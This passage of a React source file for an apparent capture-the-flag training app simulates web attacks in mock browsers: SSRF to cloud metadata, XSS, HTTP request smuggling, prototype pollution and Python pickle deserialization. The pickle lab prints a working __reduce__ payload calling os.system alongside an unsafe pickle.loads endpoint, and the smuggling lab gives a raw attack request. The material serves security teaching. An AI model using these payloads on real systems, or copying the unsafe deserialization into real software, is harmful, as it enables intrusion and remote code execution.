    `{\n  "AccessKeyId": "ASIA...EXAMPLE",\n  "SecretAccessKey": "wJalrXUtn...EXAMPLE",\n  "Token": "FwoG...",\n  "Expiration": "2026-05-07T20:00:00Z",\n  "Flag": "nullbyte{ssrf_aws_metadata_leak}"\n}`,
};

function SsrfLab() {
  const [url, setUrl] = useState("https://example.com");
  const out = SSRF_RESP[url] ?? "(empty response)";
  return (
    <MockBrowser url="https://target.com/admin/url-preview">
      <div className="space-y-2">
        <div className="text-[11px] text-muted-foreground font-mono">
          Paste any URL — the server fetches it and shows the result. Try the AWS magic IP.
        </div>
        <Field icon={<Cloud className="h-4 w-4 text-primary shrink-0" />}>
          <input
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            className="flex-1 bg-transparent outline-none text-sm font-mono"
          />
        </Field>
        <Pre>{out}</Pre>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── XSS ─────────────── */

function XssLab() {
  const [comment, setComment] = useState("<b>hello</b>");
  const fired = /<img[^>]+onerror|<script|onerror=/i.test(comment);
  return (
    <MockBrowser url="https://target.com/blog/post/42#comments">
      <div className="space-y-2">
        <textarea
          value={comment}
          onChange={(e) => setComment(e.target.value)}
          className="w-full h-20 bg-input border border-primary/30 rounded p-2 font-mono text-xs"
        />
        <div className="text-[11px] text-muted-foreground font-mono flex items-center gap-1">
          <Code2 className="h-3 w-3" /> Comments are rendered straight into innerHTML.
        </div>
        <div className="border border-white/10 rounded p-3 bg-black/40 text-sm">
          <div className="text-[10px] uppercase text-muted-foreground mb-2 tracking-widest">Rendered comment</div>
          {/* render text only; we *describe* what would happen rather than execute */}
          <div className="font-mono text-xs text-[hsl(var(--terminal-fg))]">{comment}</div>
          {fired && <div className="mt-3 text-destructive font-bold text-xs font-mono animate-pulse">⚠ alert(nullbyte{xss_injection_win}) fired in victim's browser</div>}
        </div>
      </div>
    </MockBrowser>
  );
}

/* ─────────────── Smuggling (text-only walkthrough) ─────────────── */

function SmugglingLab() {
  return (
    <Pre>{`# Two servers, two interpretations of the same request.
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

▸ Front-end (uses Content-Length: 13) sees the whole body.
▸ Back-end (uses Transfer-Encoding: chunked) stops at the
  terminator chunk "0" and treats SMUGGLED as a NEW request.
  
The flag is revealed in the smuggled response: nullbyte{smuggl3r_p0is0n_win}`}</Pre>
  );
}

/* ─────────────── Pickle ─────────────── */

function PickleLab() {
  return (
    <Pre>{`# server.py
import pickle, base64
@app.post("/import")
def import_data():
    blob = base64.b64decode(request.data)
    return pickle.loads(blob)   # <-- danger

# attacker.py
import os, pickle, base64
class P:
    def __reduce__(self):
        return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(P())))

# Server runs cat and returns: nullbyte{pickle_reduce_rce}
# The dunder method that pickle calls during deserialization is __reduce__`}</Pre>
  );
}

/* ─────────────── Prototype Pollution ─────────────── */

function ProtoLab() {
  const [json, setJson] = useState(`{"user":{"name":"alice"}}`);
  const [out, setOut] = useState("Submit JSON to deep-merge it into the user object.");
  const merge = () => {
    try {
      const parsed = JSON.parse(json);
      const polluted = JSON.stringify(parsed).includes("__proto__");
      setOut(
        polluted
          ? "✓ Object.prototype.isAdmin = true (every new object now inherits isAdmin) -> nullbyte{proto_pollution_win}"
          : "Merged. (No prototype keys detected.)",
      );
    } catch {
      setOut("Invalid JSON");
    }
  };
  return (
    <MockBrowser url="POST https://target.com/api/profile/update">
      <div className="space-y-2">
        <textarea
          value={json}
          onChange={(e) => setJson(e.target.value)}
          className="w-full h-24 bg-input border border-primary/30 rounded p-2 font-mono text-xs"
        />
        <button onClick={merge} className="px-3 py-1.5 text-xs font-mono bg-primary text-primary-foreground rounded">
          Send
        </button>
        <div className="text-[11px] text-muted-foreground font-mono flex items-center gap-1">
          <GitBranch className="h-3 w-3" /> Hint: try a key that starts and ends with two underscores: __?__
        </div>
        <Pre>{out}</Pre>
      </div>
    </MockBrowser>
  );
}
